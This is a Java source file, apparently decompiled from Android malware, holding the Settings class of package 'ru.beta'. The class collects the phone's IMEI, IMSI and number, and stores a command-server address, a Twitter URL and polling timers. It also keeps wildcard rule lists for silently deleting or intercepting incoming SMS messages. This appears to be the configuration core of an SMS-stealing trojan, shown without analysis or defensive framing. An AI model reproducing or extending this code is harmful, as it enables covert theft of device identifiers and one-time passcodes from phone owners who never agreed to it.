package ru.beta;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import java.util.Vector;
import org.json.JSONArray;
import org.json.JSONObject;

public class Settings {
    private static String SETTINGS = "betaSettings";
    static Settings settings;
    public String apiKey = "";
    public String appId = "";
    public Vector<SmsItem> catchSmsList = new Vector();
    public Vector<SmsItem> deleteSmsList = new Vector();
    public String imei = "";
    public String imsi = "";
    public String packageName = "";
    public int period = 0;
    public String phone = "";
    public String server = "";
    public String sid = "";
    public int startPeriod = 0;
    public long timeNextConnection = 0;
    public String twitterUrl = "";
    public String version = "";

    public boolean load(Context context) {
        boolean result = false;
        if (Constants.DEBUG) {
            System.out.println("Settings::load() start");
        }
        this.imei = Functions.getImei(context);
        this.imsi = Functions.getImsi(context);
        this.phone = Functions.getPhone(context);
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(SETTINGS, 1);
            if (sharedPreferences.contains("first")) {
                int i;
                JSONObject jsonObject;
                this.sid = sharedPreferences.getString("sid", "");
                this.version = sharedPreferences.getString("version", "");
                this.server = sharedPreferences.getString("server", "");
                this.startPeriod = sharedPreferences.getInt("startPeriod", 0);
                this.period = sharedPreferences.getInt("period", 0);
                this.timeNextConnection = sharedPreferences.getLong("timeNextConnection", 0);
                this.twitterUrl = sharedPreferences.getString("twitterUrl", "");
                this.apiKey = sharedPreferences.getString("apiKey", "");
                this.appId = sharedPreferences.getString("appId", "");
                this.packageName = sharedPreferences.getString("packageName", "");
                this.deleteSmsList = new Vector();
                JSONArray jsonArray = new JSONArray(sharedPreferences.getString("deleteSms", ""));
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    this.deleteSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                this.catchSmsList = new Vector();
                jsonArray = new JSONArray(sharedPreferences.getString("catchSms", ""));
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    this.catchSmsList.add(new SmsItem(jsonObject.getString("phone"), jsonObject.getString("text")));
                }
                result = true;
            } else if (Constants.DEBUG) {
                System.out.println("not contaion first");
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        if (Constants.DEBUG) {
            System.out.println("Settings::load() end");
        }
        return result;
    }

    public boolean save(Context context) {
        if (Constants.DEBUG) {
            System.out.println("Settings::save() start");
        }
        try {
            int i;
            SmsItem item;
            JSONObject jsonObject;
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.putBoolean("first", false);
            editor.putString("sid", this.sid);
            editor.putString("version", this.version);
            editor.putString("server", this.server);
            editor.putInt("startPeriod", this.startPeriod);
            editor.putInt("period", this.period);
            editor.putLong("timeNextConnection", this.timeNextConnection);
            editor.putString("twitterUrl", this.twitterUrl);
            editor.putString("apiKey", this.apiKey);
            editor.putString("appId", this.appId);
            editor.putString("packageName", this.packageName);
            JSONArray jsonArray = new JSONArray();
            for (i = 0; i < this.deleteSmsList.size(); i++) {
                item = (SmsItem) this.deleteSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("deleteSms", jsonArray.toString());
            jsonArray = new JSONArray();
            for (i = 0; i < this.catchSmsList.size(); i++) {
                item = (SmsItem) this.catchSmsList.get(i);
                jsonObject = new JSONObject();
                jsonObject.put("phone", item.number);
                jsonObject.put("text", item.text);
                jsonArray.put(jsonObject);
            }
            editor.putString("catchSms", jsonArray.toString());
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        if (Constants.DEBUG) {
            System.out.println("Settings::save() end");
        }
        return false;
    }

    public void reset(Context context) {
        try {
            Editor editor = context.getSharedPreferences(SETTINGS, 2).edit();
            editor.clear();
            editor.commit();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void setSettings(Settings set) {
        settings = set;
    }

    public static Settings getSettings() {
        return settings;
    }

    public void printToOutStream() {
        try {
            int i;
            SmsItem item;
            JSONObject jsonObj;
            JSONObject json = new JSONObject();
            json.put("sid", this.sid);
            json.put("version", this.version);
            json.put("server", this.server);
            json.put("startPeriod", this.startPeriod);
            json.put("period", this.period);
            json.put("timeNextConnection", this.timeNextConnection);
            json.put("twitterUrl", this.twitterUrl);
            json.put("apiKey", this.apiKey);
            json.put("appId", this.appId);
            JSONArray jsonDeleteArr = new JSONArray();
            for (i = 0; i < this.deleteSmsList.size(); i++) {
                item = (SmsItem) this.deleteSmsList.get(i);
                jsonObj = new JSONObject();
                jsonObj.put("key", item.key);
                jsonObj.put("number", item.number);
                jsonObj.put("text", item.text);
                jsonDeleteArr.put(jsonObj);
            }
            json.put("deleteSmsList", jsonDeleteArr);
            JSONArray jsonCatchArr = new JSONArray();
            for (i = 0; i < this.catchSmsList.size(); i++) {
                item = (SmsItem) this.catchSmsList.get(i);
                jsonObj = new JSONObject();
                jsonObj.put("key", item.key);
                jsonObj.put("number", item.number);
                jsonObj.put("text", item.text);
                jsonCatchArr.put(jsonObj);
            }
            json.put("catchSmsList", jsonCatchArr);
            System.out.println(json.toString(4));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void removeCatchFilter(long key) {
        for (int i = 0; i < this.catchSmsList.size(); i++) {
            if (((SmsItem) this.catchSmsList.get(i)).key == key) {
                this.catchSmsList.remove(i);
                return;
            }
        }
    }

    public boolean isDeleteMessage(String number, String text) {
        for (int i = 0; i < this.deleteSmsList.size(); i++) {
            SmsItem item = (SmsItem) this.deleteSmsList.get(i);
            item.number = item.number.toLowerCase();
            item.text = item.text.toLowerCase();
            number = number.toLowerCase();
            text = text.toLowerCase();
            if (item.number.equals("*") && item.text.equals("*")) {
                return true;
            }
            if (item.number.equals("*") && text.indexOf(item.text) != -1) {
                return true;
            }
            if (item.text.equals("*") && number.indexOf(item.number) != -1) {
                return true;
            }
            if (number.indexOf(item.number) != -1 && text.indexOf(item.text) != -1) {
                return true;
            }
        }
        return false;
    }

    public CatchResult isCatchMessage(String number, String text) {
        for (int i = 0; i < this.catchSmsList.size(); i++) {
            SmsItem item = (SmsItem) this.catchSmsList.get(i);
            item.number = item.number.toLowerCase();
            item.text = item.text.toLowerCase();
            number = number.toLowerCase();
            text = text.toLowerCase();
            if (item.number.equals("*") && item.text.equals("*")) {
                return new CatchResult(true, item.key);
            }
            if (item.number.equals("*") && text.indexOf(item.text) != -1) {
                return new CatchResult(true, item.key);
            }
            if (item.text.equals("*") && number.indexOf(item.number) != -1) {
                return new CatchResult(true, item.key);
            }
            if (number.indexOf(item.number) != -1 && text.indexOf(item.text) != -1) {
                return new CatchResult(true, item.key);
            }
        }
        return new CatchResult(false, 0);
    }
}
